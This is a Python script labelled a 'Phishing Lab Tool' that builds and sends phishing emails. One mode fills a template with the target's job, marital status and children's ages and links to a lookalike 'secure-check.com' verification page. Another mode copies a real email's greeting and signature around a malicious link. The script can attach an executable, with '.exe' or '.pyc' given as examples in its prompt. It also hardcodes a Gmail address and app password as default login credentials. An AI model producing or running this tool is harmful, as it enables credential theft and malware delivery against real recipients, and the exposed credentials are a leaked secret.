import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# ========== ברירת מחדל לג'ימייל ==========
DEFAULT_GMAIL = "fadinujedat22@gmail.com"
DEFAULT_GMAIL_APP_PASSWORD = "vfekyemolllyxnhg"


def build_phishing_body(username, mail_service, title, job_title, personal_status, kids_info):
    return f"""
Dear {username},<br><br>
As a {job_title} at our company, we noticed irregular activity on your {mail_service} account.<br><br>
Due to your status ({personal_status}) and family situation ({kids_info}), we've extended a grace period.<br>
Please verify your account immediately to avoid access restrictions.<br><br>
👉 <a href="https://{mail_service}.secure-check.com">Click here to verify</a><br><br>
Best regards,<br>
IT Department
"""

def mimic_email(real_email_text, malicious_link):
    lines = real_email_text.strip().split('\n')
    greeting = next((l for l in lines if "dear" in l.lower() or "hi" in l.lower()), "Dear User,")
    signature = "\n".join(lines[-3:]) if len(lines) >= 3 else "Best,<br>Joseph"
    return f"""{greeting}<br><br>
We've updated internal systems. Please verify your compliance status:<br><br>
👉 <a href="{malicious_link}">Click here to review</a><br><br>
{signature}
"""
attachment_path = input("Enter path to attachment (e.g., dist/attachment.exe or attachment.pyc): ").strip()

def send_email(smtp_server, smtp_port, from_email, to_email, subject, html_body,
               use_login=False, login_user=None, login_pass=None,
               attachment_path=None):

    msg = MIMEMultipart('mixed')  # ← מאפשר לצרף גם טקסט וגם קבצים
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(html_body, 'html'))

    # אם יש קובץ לצרף
    if attachment_path and os.path.exists(attachment_path):
        with open(attachment_path, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            filename = os.path.basename(attachment_path)
            part.add_header("Content-Disposition", f"attachment; filename={filename}")
            msg.attach(part)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        if smtp_port == 587:
            server.starttls()
        if use_login:
            server.login(login_user, login_pass)
        server.send_message(msg)

if __name__ == "__main__":
    print("=== Phishing Lab Tool ===")
    mode = input("Choose mode:\n1 - Build custom phishing email\n2 - Mimic real email\n> ")

    if mode == "1":
        username = input("Username: ")
        mail_service = input("Mail service (e.g., gmail): ")
        title = input("Subject title: ")
        job_title = input("Job title: ")
        personal_status = input("Personal status: ")
        kids_info = input("Kids/no kids and estimated ages: ")
        subject = f"{title} - Action Required"
        body = build_phishing_body(username, mail_service, title, job_title, personal_status, kids_info)

    elif mode == "2":
        print("Paste original email (end with empty line):")
        real_lines = []
        while True:
            l = input()
            if not l.strip():
                break
            real_lines.append(l)
        real_email = "\n".join(real_lines)
        malicious_link = input("Insert malicious link: ")
        subject = "⚠️ Urgent: Action Required"
        body = mimic_email(real_email, malicious_link)

    else:
        print("Invalid mode.")
        exit()

    print("\n--- Email Preview ---\n")
    print(body)

    send_now = input("\nSend email now? (y/n): ").lower()
    if send_now == 'y':
        to_email = input("Recipient email: ").strip()
        from_email = input("Sender email: ").strip()
        smtp_server = input("SMTP server (e.g., localhost / smtp.gmail.com): ").strip()
        smtp_port = int(input("SMTP port (25 = Postfix, 1025 = MailHog, 587 = Gmail): "))

        use_login = smtp_port == 587
        if use_login and smtp_server == "smtp.gmail.com":
            login_user = DEFAULT_GMAIL
            login_pass = DEFAULT_GMAIL_APP_PASSWORD
            print(f"[+] Using default Gmail account: {login_user}")
        elif use_login:
            login_user = input("Gmail username (your@gmail.com): ").strip()
            login_pass = input("Gmail App Password (not regular password): ").strip()
        else:
            login_user = login_pass = None

        send_email(smtp_server, smtp_port, from_email, to_email, subject, body,
                   use_login, login_user, login_pass, attachment_path)

        print("[+] Email sent.")
    else:
        print("[!] Email not sent.")
